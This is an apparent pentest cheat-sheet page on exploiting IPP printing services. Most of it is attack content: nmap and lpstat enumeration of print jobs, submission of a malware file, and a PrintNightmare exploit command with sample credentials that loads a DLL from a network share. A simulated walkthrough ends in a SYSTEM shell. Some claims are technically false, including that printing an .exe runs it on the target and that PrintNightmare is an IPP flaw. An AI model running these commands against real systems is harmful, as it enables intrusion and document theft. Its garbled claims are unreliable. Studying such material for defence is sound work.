<!-- Title -->
<h1 class="text-2xl font-bold mb-2">IPP (Internet Printing Protocol) Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Network Security</strong> • Focus: <strong>IPP Service Abuse & Print Exploits</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    IPP (port 631) is a network printing protocol supported by CUPS (Linux/macOS) 
    and Windows Print Spooler. Attackers exploit IPP to enumerate printers, leak sensitive 
    documents, abuse weak authentication, or trigger vulnerabilities like PrintNightmare 
    for remote code execution. Misconfigured IPP allows unauthorized users to query jobs, 
    install print drivers, and pivot deeper into enterprise networks.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>No Authentication:</strong> Some printers expose IPP without creds.</li>
    <li><strong>Info Disclosure:</strong> Job queues can leak document names & usernames.</li>
    <li><strong>Weak Access Controls:</strong> Attackers may upload or cancel print jobs.</li>
    <li><strong>Driver Exploits:</strong> Malicious drivers via IPP can trigger RCE.</li>
    <li><strong>PrintNightmare:</strong> Windows Print Spooler RCE via IPP misconfigurations.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify open IPP port (631).</li>
    <li><strong>Enumeration:</strong> Query printers, jobs, and configuration.</li>
    <li><strong>Abuse:</strong> Submit malicious jobs or capture document metadata.</li>
    <li><strong>Exploitation:</strong> Upload drivers or trigger PrintNightmare for RCE.</li>
    <li><strong>Impact:</strong> Data theft, persistence, and domain-wide compromise.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan and detect IPP service.</li>
    <li>Enumerate available printers and print jobs.</li>
    <li>Check for anonymous or weak authentication.</li>
    <li>Exploit misconfigurations (job hijacking, file exfil, driver injection).</li>
    <li>Trigger RCE vulnerabilities like PrintNightmare if unpatched.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -p 631 -sV --script ipp-enum [target]       # Scan for IPP
nmap --script ipp* [target]                      # Run IPP NSE scripts

# ------------------------------
# Enumerating Printers
# ------------------------------
lpstat -h [target] -p -d                         # List printers
lpstat -h [target] -o                            # List print jobs
ippfind                                          # Discover IPP printers

# ------------------------------
# Submitting Jobs
# ------------------------------
lp -h [target] -d printer file.txt               # Submit print job
cancel -h [target] job-ID                        # Cancel job

# ------------------------------
# Exploiting PrintNightmare (Windows)
# ------------------------------
# Using Impacket
python3 CVE-2021-1675.py corp.local/jdoe:Pass123@192.168.1.50 '\\\\192.168.1.100\\share\\payload.dll'

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p 631 192.168.1.100 -sV --script ipp-enum
lpstat -h 192.168.1.100 -p -d
lpstat -h 192.168.1.100 -o
lp -h 192.168.1.100 -d printer malware.exe
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -p 631 -sV --script ipp-enum 192.168.1.100
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.2
| ipp-enum: 
|   Printer: HP-LaserJet
|   Status: Idle
|_  Jobs: 0 active

[ saide ~ ]$ lpstat -h 192.168.1.100 -p -d
printer HP-LaserJet is idle.  enabled since Mon 2025-09-01
system default destination: HP-LaserJet

[ saide ~ ]$ lpstat -h 192.168.1.100 -o
HP-LaserJet-1  jdoe   10240   Sep 05 10:12 secret_financials.pdf

[ saide ~ ]$ lp -h 192.168.1.100 -d HP-LaserJet /tmp/malware.exe
request id is HP-LaserJet-13 (1 file(s))

[ saide ~ ]$ python3 CVE-2021-1675.py corp.local/jdoe:Pass123@192.168.1.50 '\\\\192.168.1.100\\share\\rev.dll'
[*] Exploiting Print Spooler...
[*] DLL uploaded and executed, SYSTEM shell obtained!

[ saide ~ ]$ whoami
nt authority\system
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample IPP exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Printer Enumeration
Discovered Printer: HP-LaserJet
Default Printer: HP-LaserJet

# Job Information
Active Job: secret_financials.pdf (submitted by jdoe)

# Exploited Printer Job
Malware.exe uploaded → executed on target system

# PrintNightmare Exploit
SYSTEM-level shell on domain controller:
nt authority\system
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ipp" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting IPP
      </a>
    </li>
    <li>
      <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        Microsoft CVE-2021-34527 (PrintNightmare)
      </a>
    </li>
    <li>Common Red Team workflow: IPP enumeration → Job metadata → Driver upload → RCE.</li>
  </ul>
</section>
